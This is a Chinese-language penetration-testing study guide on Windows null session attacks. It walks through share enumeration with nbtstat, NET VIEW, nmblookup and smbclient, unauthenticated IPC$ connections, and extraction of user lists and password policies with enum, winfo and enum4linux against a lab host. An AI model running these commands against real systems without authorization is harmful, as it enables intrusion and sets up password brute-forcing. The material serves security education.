---
layout: post
title: "Null Sessions"
date: "2022-07-18"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Null Sessions - Study Guide（空会话 - 学习指南）
这如何支持我的渗透测试生涯？
* 了解历史漏洞
* 可以在旧系统上找到空会话
* 加深对 Windows 共享的理解

**空会话攻击**可用于枚举大量信息。 攻击者可以窃取以下信息：
* 密码
* 系统用户
* 系统组
* 运行系统进程

空会话可远程利用； 这意味着攻击者可以使用他们的计算机来攻击易受攻击的 Windows 计算机。 此外，这种攻击可用于调用远程 APIs 和远程程序调用。 由于这些因素，空会话攻击对 Windows 生态系统产生了巨大影响。
**如今，Windows 已配置为免受此类攻击。 但是，旧版主机仍然容易受到攻击！**

空会话攻击利用 Windows 管理共享的身份验证漏洞； 这使攻击者无需身份验证即可连接到本地或远程共享。
我们将通过使用各种技术和工具来枚举 Windows 共享及其利用。

## Enumerating Windows Shares（枚举 Windows 共享）
枚举共享是利用易受空会话攻击的 Windows 计算机所需的第一步。
我们将了解如何使用一些 Windows 和 Linux 工具来执行此阶段。

### NbtStat
在 Windows 中，枚举 Windows 共享时最常用的命令是 `nbtstat`。
`nbtstat` 是一个 Windows 命令行工具，可以显示有关目标的信息。

您可以通过传递 `/?` 参数来检查如何使用它。

```
nbtstat /?

显示协议统计和当前使用 NBI 的 TCP/IP 连接
(在 TCP/IP 上的 NetBIOS)。

NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]
        [-r] [-R] [-RR] [-s] [-S] [interval] ]

  -a   (适配器状态)    列出指定名称的远程机器的名称表
  -A   (适配器状态)    列出指定 IP 地址的远程机器的名称表。
  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存
  -n   (名称)          列出本地 NetBIOS 名称。
  -r   (已解析)        列出通过广播和经由 WINS 解析的名称
  -R   (重新加载)      清除和重新加载远程缓存名称表
  -S   (会话)          列出具有目标 IP 地址的会话表
  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。
  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新

  RemoteName   远程主机计算机名。
  IP address   用点分隔的十进制表示的 IP 地址。
  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。
               按 Ctrl+C 停止重新显示统计。
```

`nbtstat` 最常见的用法是`nbtstat -A <IP>`，它显示有关目标的信息。

```
nbtstat -A 10.130.40.80

Local Area Connection:
Node Padres: [10.0.2.15] Scope Id: []

NetBIOS Remote Machine Name Table

Name                Type        Status
----------------------------------------------------
ELS-WINXP   <00>    UNIQUE      Registered
WORKGROUP   <00>    GROUP       Registered
ELS-WINXP   <20>    UNIQUE      Registered
WORKGROUP   <1E>    GROUP       Registered

MAC Address = 00-0C-29-BF-98-BD
```

我们来分析一下命令输出。

表格的第一行告诉我们，运行在 10.130.40.80 的机器的名称是“`ELS-WINXP`”。
记录类型 `<00>` 告诉我们 `ELS-WINXP` 是一个工作站。

“`UNIQUE`”类型告诉我们，这台计算机必须只分配一个 IP 地址。

此行包含计算机加入的工作组或域。

这是表中最有趣的一行！
`<20>` 类型记录告诉我们文件共享服务已在机器上启动并运行； 这意味着我们可以尝试获取更多有关它的信息。

### NET VIEW
一旦攻击者知道机器正在运行`文件服务器`服务，他们就可以使用 NET VIEW 命令枚举共享。
您可以通过键入以下命令来使用该命令：

```
NET VIEW <target IP>
```

我们可以在上一个目标上使用它：

```
NET VIEW 10.130.40.80
Shared resources at 10.130.40.80

Share name      Type        Used as     Comment
------------------------------------------------------
eLS             Disk
WIA_RIS_SHARE   Disk
The command completed successfully.
```

这台机器正在共享一个目录； 共享名称是 eLS。

共享上的另一个目录是 WIA_RIS_SHARE。

### Nmblookup
您还可以从 Linux 机器执行共享枚举。 您需要使用 [Samba suite](https://www.samba.org/)提供的工具。
Samba 工具已经安装在 Kali Linux 中，但您几乎可以在每个 Linux 发行版中安装它们。

要执行 nbtstat 的相同操作，您可以使用带有相同命令行开关的 nmblookup：

```
nmblookup -A <target ip address>
```

像往常一样，您可以使用手册或简要帮助来检查 nmblookup 的工作原理：

```
└─# nmblookup --help
Usage: <NODE> ...
  -B, --broadcast=BROADCAST-ADDRESS         Specify address to use for broadcasts
  -f, --flags                               List the NMB flags returned
  -U, --unicast=STRING                      Specify address to use for unicast
  -M, --master-browser                      Search for a master browser
      --recursion                           Set recursion desired in package
  -S, --status                              Lookup node status as well
  -T, --translate                           Translate IP addresses into names
  -r, --root-port                           Use root port 137 (Win95 only replies to this)
  -A, --lookup-by-ip                        Do a node status on <name> as an IP Address

Help options:
  -?, --help                                Show this help message
      --usage                               Display brief usage message

Common Samba options:
  -d, --debuglevel=DEBUGLEVEL               Set debug level
      --debug-stdout                        Send debug output to standard output
  -s, --configfile=CONFIGFILE               Use alternative configuration file
      --option=name=value                   Set smb.conf option from command line
  -l, --log-basename=LOGFILEBASE            Basename for log/debug files
      --leak-report                         enable talloc leak reporting on exit
      --leak-report-full                    enable full talloc leak reporting on exit

Connection options:
  -R, --name-resolve=NAME-RESOLVE-ORDER     Use these name resolution services only
  -O, --socket-options=SOCKETOPTIONS        socket options to use
  -m, --max-protocol=MAXPROTOCOL            Set max protocol level
  -n, --netbiosname=NETBIOSNAME             Primary netbios name
      --netbios-scope=SCOPE                 Use this Netbios scope
  -W, --workgroup=WORKGROUP                 Set the workgroup name
      --realm=REALM                         Set the realm name

Version options:
  -V, --version                             Print version
```

```
用法：<节点> ...
  -B, --broadcast=BROADCAST-ADDRESS 指定用于广播的地址
  -f, --flags 列出返回的 NMB 标志
  -U, --unicast=STRING 指定用于单播的地址
  -M, --master-browser 搜索主浏览器
      --recursion 在包中设置所需的递归
  -S, --status 也查找节点状态
  -T, --translate 将 IP 地址转换为名称
  -r, --root-port 使用root端口137（Win95只回复这个）
  -A, --lookup-by-ip 将 <name> 上的节点状态作为 IP 地址

帮助选项：
  -?, --help 显示此帮助信息
      --usage 显示简要使用信息

常见的 Samba 选项：
  -d, --debuglevel=DEBUGLEVEL 设置调试级别
      --debug-stdout 将调试输出发送到标准输出
  -s, --configfile=CONFIGFILE 使用替代配置文件
      --option=name=value 从命令行设置 smb.conf 选项
  -l, --log-basename=LOGFILEBASE 日志/调试文件的基本名称
      --leak-report 在退出时启用tal​​loc泄漏报告
      --leak-report-full 在退出时启用完整的talloc泄漏报告

连接选项：
  -R, --name-resolve=NAME-RESOLVE-ORDER 仅使用这些名称解析服务
  -O, --socket-options=SOCKETOPTIONS 要使用的套接字选项
  -m, --max-protocol=MAXPROTOCOL 设置最大协议级别
  -n, --netbiosname=NETBIOSNAME 主 netbios 名称
      --netbios-scope=SCOPE 使用这个 Netbios 范围
  -W, --workgroup=WORKGROUP 设置工作组名称
      --realm=REALM 设置领域名称

版本选项：
  -V, --version 打印版本
```

这是我们在同一台目标机器上运行 nmblookup 得到的结果。 我们得到相同的结果：

```
nmblookup -A 10.130.40.80
Looking up status of 10.130.40.80
    ELS-WINXP   <00>    -           M <ACTIVE>
    WORKGROUP   <00>    -   <GROUP> M <ACTIVE>
    ELS-WINXP   <20>    -           M <ACTIVE>
    WORKGROUP   <1e>    -   <GROUP> M <ACTIVE>

    MAC Address = 00-0c-29-BF-98-BD
```

### Smbclient
Samba 套件还提供 smbclient，一个类似 FTP 的客户端来访问 Windows 共享； 除其他外，此工具可以枚举主机提供的共享：

```
smbclient -L //10.130.40.80 -N
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
Sharename       Type        Comment
---------       ----        -------
eLS             Disk
IPC$            IPC         Remote IPC
WIA_RIS_SHARE   Disk
ADMIN$          Disk        Remote Admin
C$              Disk        Default share
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
```

前面的命令行使用以下选项：
* `-L` 允许您查看目标上可用的服务
* 使用 `//<IP Address>` 您必须在目标 IP 地址前添加两个斜杠
* `-N` 强制工具不要求输入密码

现在让我们检查一下结果。

Smbclient 不仅可以检测到 NET VIEW 检测到的完全相同的共享...

```
smbclient -L //10.130.40.80 -N
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
Sharename       Type        Comment
---------       ----        --------
eLS             Disk
IPC$            IPC         Remote IPC
WIA_RIS_SHARE   Disk
ADMIN$          Disk        Remote Admin
C$              Disk        Default share
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
```

…但它也显示使用 Windows 标准工具时隐藏的管理共享。

## Checking for Null Sessions（检查空会话）
一旦我们检测到文件和打印机共享服务处于活动状态并且我们已经枚举了目标上的可用共享，就该检查是否可能进行空会话攻击。
为了验证这一点，我们将通过尝试在没有有效凭据的情况下连接到 IPC$ 管理共享来利用它。

### Checking for Null Sessions with Windows（使用 Windows 检查空会话）
要连接，您必须在 Windows shell 中键入以下命令：

```
NET USE \\<target IP address>\IPC$ '' /u:''
```

这告诉 Windows 使用空密码和空用户名连接到 `IPC$` 共享！

让我们在目标上尝试命令：

```
net use \\10.130.40.80\IPC$ '' /u:''
The command completed successfully.
```

前面的命令在没有指定用户的情况下建立到 `IPC$` 管理共享的连接； 这是可能的，因为我们的目标主机容易受到空会话攻击。 此测试仅适用于 `IPC$`。 例如，它不适用于 `C$`：

```
net use \\10.130.40.80\c$ '' /u:''
System error 5 has occurred.

Access is denied.
```

### Checking for Null Sessions with Linux（使用 Linux 检查空会话）
您还可以使用 smbclient 执行相同的检查：

```
smbclient //10.130.40.80/IPC$ -N
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
smb: \> exit

smbclient //10.130.40.80/c$ -N
Domain=[ELS-WINXP] OS=[Windows 5.1] Server=[Windows 2000 LAN Manager]
tree connect failed: NT_STATUS_ACCESS_DENIED
```

## Exploiting Null Sessions（利用空会话）
可以使用 Windows NET 命令来利用空会话，但是有一些工具可以自动执行此任务。
在下面的幻灯片中，您将看到如何使用一些免费提供的 Windows 和 Linux 工具。

### Exploiting Null Sessions with Enum（使用Enum利用空会话）
其中之一是 [Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)，这是一个命令行实用程序，可以从易受空会话攻击的系统中检索信息。
您可以通过提取它并从 Windows 命令提示符运行它来安装它。

`-S` 参数允许您枚举机器的共享：

```
enum -S 10.130.40.80
Server: 10.130.40.80
setting up session... success.
enumerating shares (pass 1)... got 5 shares, 0 left:
    eLS IPC$ WIA_RIS_SHARE ADMIN$ C$
cleaning up... success.
```

请注意，它也列举了管理共享。

`-U` 枚举用户：

```
enum -U 10.130.40.80
server: 10.130.40.80
setting up session... success.
getting user list (pass 1, index 0)... success, got 5.
  Administrator eLS Guest HelpAssistant SUPPORT_388945a0
cleaning up... success.
```

这台机器有五个用户帐户。

如果需要挂载网络认证攻击，可以通过`-P`参数查看密码策略：

```
enum -P 10.130.40.80
server: 10.130.40.80
setting up session... success.
password policy:
  min length: none
  min age: none
  max age: 42 days
  lockout threshold: none
  lockout duration: 30 mins
  lockout reset: 30 mins
cleaning up... success.
```

在运行身份验证攻击之前检查密码策略可以让您微调攻击工具以：
* 防止帐户锁定
* 防止误报
* 选择您的字典或暴力破解配置

了解密码的最小和最大长度有助于您在暴力破解密码时节省时间。

### Exploiting Null Sessions with Winfo（使用 Winfo 利用空会话）
Winfo 是另一个命令行实用程序，可用于自动利用空会话。 要使用它，您只需指定目标 IP 地址并使用 `-n` 命令行开关告诉该工具使用空会话。

```
winfo 10.130.40.80 -n
```

您可以从 [packetstorm](https://packetstormsecurity.com/search/?q=winfo&s=files) 下载它。

### Exploiting Null Sessions with Enum4linux（使用 Enum4linux 利用空会话）
渗透测试人员还可以通过使用 enum4linux 来利用空会话，这是一个 PERL 脚本，可以执行与 enum 和 Winfo 相同的操作。
它具有与原始enum工具相同的命令行选项； 此外，它还提供了一些其他功能。

默认情况下，它执行：
* 用户枚举
* 共享枚举
* 组和成员枚举
* 密码策略提取
* 操作系统信息检测
* nmblookup 运行
* 打印机信息提取

您可以通过在命令行上调用 `enum4linux` 来检查它的选项：

```
└─# enum4linux                       
enum4linux v0.9.1 (http://labs.portcullis.co.uk/application/enum4linux/)
Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)

Simple wrapper around the tools in the samba package to provide similar 
functionality to enum.exe (formerly from www.bindview.com).  Some additional 
features such as RID cycling have also been added for convenience.

Usage: ./enum4linux.pl [options] ip

Options are (like "enum"):
    -U        get userlist
    -M        get machine list*
    -S        get sharelist
    -P        get password policy information
    -G        get group and member list
    -d        be detailed, applies to -U and -S
    -u user   specify username to use (default "")  
    -p pass   specify password to use (default "")   

The following options from enum.exe aren't implemented: -L, -N, -D, -f

Additional options:
    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
              This option is enabled if you don't provide any other options.
    -h        Display this help message and exit
    -r        enumerate users via RID cycling
    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
    -K n      Keep searching RIDs until n consective RIDs don't correspond to
              a username.  Impies RID range ends at 999999. Useful 
              against DCs.
    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
    -s file   brute force guessing for share names
    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
              Used to get sid with "lookupsid known_username"
              Use commas to try several users: "-k admin,user1,user2"
    -o        Get OS information
    -i        Get printer information
    -w wrkg   Specify workgroup manually (usually found automatically)
    -n        Do an nmblookup (similar to nbtstat)
    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
    -A        Aggressive. Do write checks on shares etc

RID cycling should extract a list of users from Windows (or Samba) hosts 
which have RestrictAnonymous set to 1 (Windows NT and 2000), or "Network 
access: Allow anonymous SID/Name translation" enabled (XP, 2003).

NB: Samba servers often seem to have RIDs in the range 3000-3050.

Dependancy info: You will need to have the samba package installed as this 
script is basically just a wrapper around rpcclient, net, nmblookup and 
smbclient.  Polenum from http://labs.portcullis.co.uk/application/polenum/ 
is required to get Password Policy info.
```

```
└─# enum4linux
enum4linux v0.9.1 (http://labs.portcullis.co.uk/application/enum4linux/)
版权所有 (C) 2011 Mark Lowe (mrl@portcullis-security.com)

对 samba 包中工具的简单包装，以提供与 enum.exe（以前来自 www.bindview.com）类似的功能。为方便起见，还添加了一些附加功能，例如 RID 循环。

用法：./enum4linux.pl [选项] ip

选项是（如“枚举”）：
    -U 获取用户列表
    -M 获取机器列表*
    -S 获取共享列表
    -P 获取密码策略信息
    -G 获取组和成员列表
    -d 详细一点，适用于 -U 和 -S
    -u 用户指定要使用的用户名（默认“”）
    -p pass 指定要使用的密码（默认“”）

未实现 enum.exe 中的以下选项：-L、-N、-D、-f

附加选项：
    -a 做所有简单的枚举（-U -S -G -P -r -o -n -i）。
              如果您不提供任何其他选项，则会启用此选项。
    -h 显示此帮助信息并退出
    -r 通过 RID 循环枚举用户
    -R range 要枚举的 RID 范围（默认值：500-550,1000-1050，暗示 -r）
    -K n 继续搜索 RID，直到 n 个连续的 RID 与用户名不对应。 Impies RID 范围结束于 999999。对 DC 有用。
    -l 通过 LDAP 389/TCP 获取一些（有限的）信息（仅适用于 DC）
    -s 文件暴力猜测共享名称
    -k user 远程系统上存在的用户（默认：administrator,guest,krbtgt,domain admins,root,bin,none） 用于通过“lookupsid known_username”获取 sid 使用逗号尝试多个用户：“-k admin ,用户1,用户2"
    -o 获取操作系统信息
    -i 获取打印机信息
    -w wrkg 手动指定工作组（通常自动找到）
    -n 执行 nmblookup（类似于 nbtstat）
    -v 详细。显示正在运行的完整命令（net、rpcclient 等）
    -A 激进的。在共享上写检查

RID 循环应该从将 RestrictAnonymous 设置为 1（Windows NT 和 2000）或启用“网络访问：允许匿名 SID/名称转换”（XP，2003）的 Windows（或 Samba）主机中提取用户列表。

注意：Samba 服务器的 RID 似乎通常在 3000-3050 范围内。

依赖信息：您需要安装 samba 包，因为该脚本基本上只是 rpcclient、net、nmblookup 和 smbclient 的包装器。需要从 http://labs.portcullis.co.uk/application/polenum/ 获取密码策略信息。
```

## About Null Sessions（关于空会话）
空会话是 Windows 黑客攻击历史的一部分。 即使默认情况下它们在现代 Microsoft 操作系统中未启用，您有时也可以在企业网络上找到它们； 这是因为与旧系统和应用程序的复古兼容性。

## References
[Samba suite](https://www.samba.org/)

[Enum](https://packetstormsecurity.com/search/?q=win32+enum&s=files)

[Packetstorm](https://packetstormsecurity.com/search/?q=winfo&s=files)/[Winfo](https://packetstormsecurity.com/search/?q=winfo&s=files)